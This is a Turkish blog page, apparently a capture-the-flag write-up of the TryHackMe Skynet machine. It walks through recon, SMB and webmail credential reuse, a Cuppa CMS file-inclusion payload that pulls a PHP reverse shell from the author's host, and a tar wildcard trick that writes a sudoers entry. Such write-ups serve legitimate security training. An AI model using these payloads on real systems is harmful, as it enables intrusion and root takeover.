@@ -1,0 +1,291 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>THM Skynet Çözüm | order6tyfix</title>
+  <meta name="author" content="order6tyfix">
+  
+  <meta name="description" content="Makine Linki
+Recon
+Nmap taramasıyla makineyı çözümlemeye naşlıyorum.
+1234567891011121314151617nmap -sS -sV 10.10.104.98Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-20 15:59 +03Nmap scan report for 10.10.104.98Host is up (0.087s latency).Not shown: 994 closed portsPORT    STATE SERVICE     VERSION22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))110/tcp open  pop3        Dovecot pop3d139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp open  imap        Dovecot imapd445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.11 seconds
+Nmap çıktısından makinede birçok farklı servisin çalıştığını gözlemledim. Bu kadar çok servis çalışması atak vektörlerinin olasılıklarını arttırıyor. Özellikle pop3 ve smb servisleri muhtemel bir atak vektörü oluşturabilir.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="THM Skynet Çözüm"/>
+  <meta property="og:site_name" content="order6tyfix"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-70812759-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+  <meta name="google-site-verification" content="3rmbjRm8lV6IvILUmHkuMJMbbUgfoZd6Z83DjdlvMn8" />
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">order6tyfix</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Arsiv
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Kategoriler
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Etiketler
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>Hakkımda
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> THM Skynet Çözüm</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><a target="_blank" rel="noopener" href="https://tryhackme.com/room/skynet">Makine Linki</a></p>
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><hr>
+<p>Nmap taramasıyla makineyı çözümlemeye naşlıyorum.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV 10.10.104.98</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-20 15:59 +03</span><br><span class="line">Nmap scan report for 10.10.104.98</span><br><span class="line">Host is up (0.087s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">110/tcp open  pop3        Dovecot pop3d</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp open  imap        Dovecot imapd</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.11 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Nmap çıktısından makinede birçok farklı servisin çalıştığını gözlemledim. Bu kadar çok servis çalışması atak vektörlerinin olasılıklarını arttırıyor. Özellikle pop3 ve smb servisleri muhtemel bir atak vektörü oluşturabilir.</p>
+<span id="more"></span>
+
+<p>İlk önce web sunucusuna bakacağım. 80 portunda servis edilen bir apache web sunucu var. Sunucudaki alt dizinler işime yarayabilir. Alt dizinleri listelemek için <code>dirb http://10.10.104.98</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.10.104.98/ ----</span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.98/admin/                                      </span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.98/config/                                     </span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.98/css/                                        </span><br><span class="line">+ http://10.10.104.98/index.html (CODE:200|SIZE:523)                           </span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.98/js/                                         </span><br><span class="line">+ http://10.10.104.98/server-status (CODE:403|SIZE:277)                        </span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.98/squirrelmail/                               </span><br></pre></td></tr></table></figure>
+
+<p>Sunucudaki <code>squirrelmail</code> alt dizini bir mail servisi barındırıyor. Bu daha sonra işime yarayabilir.</p>
+<p>Port taramasında açık olan smb servisini de analiz etmek akıllıca olacaktır. Smb servisin daha detaylı analiz etmek için enum4linux kullanabilirim. <code>enum4linux 10.10.104.98</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> ========================================= </span><br><span class="line">|    Share Enumeration on 10.10.104.98    |</span><br><span class="line"> ========================================= </span><br><span class="line"></span><br><span class="line">	Sharename       Type      Comment</span><br><span class="line">	---------       ----      -------</span><br><span class="line">	print$          Disk      Printer Drivers</span><br><span class="line">	anonymous       Disk      Skynet Anonymous Share</span><br><span class="line">	milesdyson      Disk      Miles Dyson Personal Share</span><br><span class="line">	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</br>
+
+
+<p>anonymous ve milesdyson dosya paylaşımları işime yarayabilir ve <code>anonymous</code> paylaşımına şifre olmadan da erişebilirim.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient &#x27;\\10.10.104.98\anonymous&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>Smb ile bağlantı kurduktan sonra dizinde yer alan dosyaları get komutuyla kendi makineme çekebilirim. <code>get attention.txt</code>. Log dosyalarına bir göz atmak mantıklı olacak.</p>
+<p>Dosyaları çekikten sonra içeriklerine baktığımda <code>log1.txt</code> içinde şifre olarak kullanabileceğim string’ler mevcut. <code>attention.txt</code> içinde de Miles Dyson tarafından skynet çalışanlarına yazılmış bir not var. Miles Dyson ismi smb taramasında çıkan <code>milesdyson</code> dosya paylaşımıyla da ismen uyuşuyor.</p>
+<p>Şimdiye kadar bulduğum login formu olan tek sayfa <code>squirrelmail</code>. Milesdyson ve <code>log1.txt</code> içindeki şifreleri giriş formunda deneyebilirim. İlk şifreyi deniyorum ve giriş başarılı. <code>skynet@skynet</code> tarafından gönderilen mailde milesdyson abimizin smb şifresini sıfırladıkları ve şifrenin ta kendisi yazıyor.</p>
+<p>milesdyson olarak smb servisine login<code>(smbclient -U milesdyson \\\\10.10.104.98\\milesdyson )</code> olduktan sonra dosya sisteminde gezindiğimde notes dizinin altında important.txt diğer dosyaların arasında hemen fark ediliyor. <code>important.txt</code> dosyasını kendi makinememde açtığımda <code>/45kra24zxs28v3yd</code> altında CMS bulunduğu ve beta aşamasında olduğunu anlıyorum.</p>
+<p>Tarayıcımda <code>10.10.104.98/45kra24zxs28v3yd</code> açtığımda işe yarar bir şey bulamadım. CMS’in login sayfasını manuel olarak denerken <code>administrator</code> ‘da olumlu dönüt aldım. Cuppa CMS için olası exploitleri arattığımda ilk karşıma çıkan şey <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/25971">File Inclusion</a>. Exploit basitçe alerts/alertConfigField.php içindeki bulunan aşşağıdaki koddan doğuyor.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include($_REQUEST[&quot;urlConfig&quot;]); ?&gt;</span><br></pre></td></tr></table></figure>
+</br>
+
+<h1 id="EXPLOITATION"><a href="#EXPLOITATION" class="headerlink" title="EXPLOITATION"></a>EXPLOITATION</h1><hr>
+<p>Exploit’in açıklandığı yazının devamında aşşağıdaki payload ile zafiyeti sömürebileceğimden bahsediliyor.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?</span><br></pre></td></tr></table></figure>
+
+<p>İlk önce php için bir <a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">reverse shell</a> lazım. Ardından dosyayı kendi ip ve port değerlerim ile değiştiriyorum. Port için 1234 seçtim ve <code>nc -lvnp 1234</code> ile dinlemeye aldım. Reverse shell’in bulunduğu dizinde <code>python3 -m SimpleHTTPServer</code> ile bir sunucu servis etmeye başlıyorum ki hedef makina shell kodunu çekebilsin.</p>
+<p>Artık tek yapmam gereken tarayıcımda aşşağıdaki adrese gitmek.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.73.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.66.44:8000/shell.php?</span><br></pre></td></tr></table></figure>
+<h1 id="PRIV-ESC"><a href="#PRIV-ESC" class="headerlink" title="PRIV ESC"></a>PRIV ESC</h1><hr>
+<p>Artık kendi makinamda shell aldım. Priv esc denerken ilk denediğim iki şey genelde <code>sudo -l</code> ve <code>cat /etc/crontab</code>. Sudo’dan bir şey çıkmadı fakat crontab’de her dakika çalıştırılan bir dosya var(/home/milesdyson/backups/backup.sh). </p>
+<p>Backup dosyasının işlevi /var/www/html dizininin hepsini sıkıştırmak ve miles’ın home dizinine kaydetmek ve bu işlem root kullanıcısı tarafından gerçekleştiriliyor. Biraz araştırma yaptıktan sonra bu <a target="_blank" rel="noopener" href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/">yazıya</a> denk geldim. Yazıda backup.sh içindeki <code>tar cf /home/milesdyson/backups/backup.tgz *</code> satırındaki “*” karakterinden doğabilecek bir yetki yükseltme tekniği anlatılıyor.</p>
+<p>Yazıda anlatılan yöntemi deniyorum.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo ‘echo “www-data ALL=(root) NOPASSWD: ALL” &gt; /etc/sudoers’ &gt; privesc.sh</span><br><span class="line">echo “/var/www/html” &gt; “–checkpoint-action=exec=sh privesc.sh”</span><br><span class="line">echo “/var/www/html” &gt; –checkpoint=1</span><br></pre></td></tr></table></figure>
+
+<p>Birkaç dakika bekledikten sonra <code>sudo bash</code> yolladığımda root yetkilerini almış oldum.</p>
+	  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>önceki yazı</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Ana menü</a>
+    
+    <a href="/2022/02/27/THM-Borderlands-Cozum-Bolum-2/" type="button" class="btn btn-default ">sonraki yazı<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2022-03-20 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+I'm gonna be on television.
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎YUKARI</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+
+</body>
+   </html>
